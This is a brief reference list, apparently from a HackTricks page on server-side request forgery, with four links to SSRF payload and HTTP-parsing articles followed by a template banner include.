- [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)

{{#include ../../banners/hacktricks-training.md}}
